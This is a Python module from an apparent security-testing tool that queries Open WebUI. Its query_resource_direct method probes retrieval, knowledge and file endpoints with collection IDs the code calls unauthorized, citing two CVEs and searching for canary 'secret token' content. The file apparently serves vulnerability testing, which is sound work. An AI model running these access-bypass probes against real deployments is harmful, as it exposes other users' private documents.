"""
Open WebUI Query Mixin.
Handles chat completions, RAG context retrieval, and direct vector query probes.
"""

from __future__ import annotations

import logging
from typing import Dict, Any, List, Optional, Tuple

from adapters.base import UserSession

logger = logging.getLogger("firedamp.adapters.openwebui.query")


class OpenWebUIQueryMixin:
    """RAG chat completions and direct resource retrieval queries."""

    DEFAULT_MODEL = "llama3:8b"

    def query_rag(
        self,
        base_url: str,
        session: UserSession,
        prompt: str,
        model: Optional[str] = None,
    ) -> Tuple[str, List[str], Dict[str, Any]]:
        """
        Query via POST /api/chat/completions with knowledge collection references.
        Returns (assistant_text, list_of_retrieved_context_strings, raw_response_dict).
        """
        base = base_url.rstrip("/")

        # Build files[] from the session's knowledge collections
        files_payload: List[Dict[str, str]] = []
        for kb_id in session.metadata.get("knowledge_ids", []):
            files_payload.append({"type": "collection", "id": kb_id})

        payload: Dict[str, Any] = {
            "model": model or getattr(self, "DEFAULT_MODEL", "llama3:8b"),
            "messages": [{"role": "user", "content": prompt}],
            "stream": False,
        }
        if files_payload:
            payload["files"] = files_payload

        res = self._json_request(
            f"{base}/api/chat/completions",
            method="POST",
            data=payload,
            headers=session.headers,
            timeout=120,
        )

        assistant_text, retrieved_contexts = self._parse_chat_response(res)
        return assistant_text, retrieved_contexts, res

    def query_resource_direct(
        self,
        base_url: str,
        session: UserSession,
        resource_ref: str,
        k: int = 50,
    ) -> Tuple[str, List[str], Dict[str, Any]]:
        """
        Calls direct retrieval endpoint referencing an unauthorized collection or file ID.
        Attempts multiple direct vector query routes:
        1. /api/v1/retrieval/query (direct vector search)
        2. /api/v1/knowledge/{id} (direct collection inspect)
        3. /api/v1/files/{id}/content (direct file content retrieval)
        """
        base = base_url.rstrip("/")
        retrieved_contexts: List[str] = []

        # 1. Direct retrieval endpoint probe (CVE-2026-44560, CVE-2026-45398)
        direct_payload = {
            "collection_names": [resource_ref],
            "collection_name": resource_ref,
            "query": "canary confidential secret token document summary",
            "k": k,
        }
        res = self._json_request(
            f"{base}/api/v1/retrieval/query",
            method="POST",
            data=direct_payload,
            headers=session.headers,
            timeout=30,
        )

        # Extract chunks from direct vector response
        documents = res.get("documents", [])
        if isinstance(documents, list):
            for doc in documents:
                if isinstance(doc, list):
                    for chunk in doc:
                        if isinstance(chunk, str) and chunk:
                            retrieved_contexts.append(chunk)
                elif isinstance(doc, str) and doc:
                    retrieved_contexts.append(doc)

        # 2. If no chunks found, test knowledge API inspection
        if not retrieved_contexts and not res.get("error"):
            kb_res = self._json_request(
                f"{base}/api/v1/knowledge/{resource_ref}",
                method="GET",
                headers=session.headers,
            )
            if not kb_res.get("error"):
                res = kb_res
                desc = kb_res.get("description", "")
                if desc:
                    retrieved_contexts.append(desc)

        return "", retrieved_contexts, res

    @staticmethod
    def _parse_chat_response(res: Dict[str, Any]) -> Tuple[str, List[str]]:
        """Extract assistant text and context chunks from all known response shapes."""
        assistant_text = ""
        retrieved_contexts: List[str] = []

        choices = res.get("choices", [])
        if choices:
            message = choices[0].get("message", {})
            assistant_text = message.get("content", "")

            # Sources attached to message (varies by Open WebUI version)
            for key in ("sources", "citations", "context"):
                raw = message.get(key)
                if raw:
                    OpenWebUIQueryMixin._extract_contexts(raw, retrieved_contexts)

            # Top-level context field (some versions)
            ctx_field = choices[0].get("context")
            if isinstance(ctx_field, str) and ctx_field:
                retrieved_contexts.append(ctx_field)
        else:
            # Non-standard response shape fallback
            assistant_text = (
                res.get("response", "") or
                res.get("content", "") or
                res.get("message", {}).get("content", "")
            )

        # Top-level sources/citations (outside choices)
        for key in ("sources", "citations"):
            raw = res.get(key)
            if raw:
                OpenWebUIQueryMixin._extract_contexts(raw, retrieved_contexts)

        return assistant_text, retrieved_contexts

    @staticmethod
    def _extract_contexts(raw: Any, out: List[str]) -> None:
        """Recursively pull text from sources/citations in various nested shapes."""
        if isinstance(raw, str):
            if raw:
                out.append(raw)
            return
        if isinstance(raw, list):
            for item in raw:
                OpenWebUIQueryMixin._extract_contexts(item, out)
            return
        if isinstance(raw, dict):
            for field in ("content", "text", "snippet"):
                val = raw.get(field)
                if isinstance(val, str) and val:
                    out.append(val)
            doc = raw.get("document")
            if isinstance(doc, dict):
                OpenWebUIQueryMixin._extract_contexts(doc, out)
            meta = raw.get("metadata")
            if isinstance(meta, dict):
                src = meta.get("source")
                if isinstance(src, str) and src:
                    out.append(src)

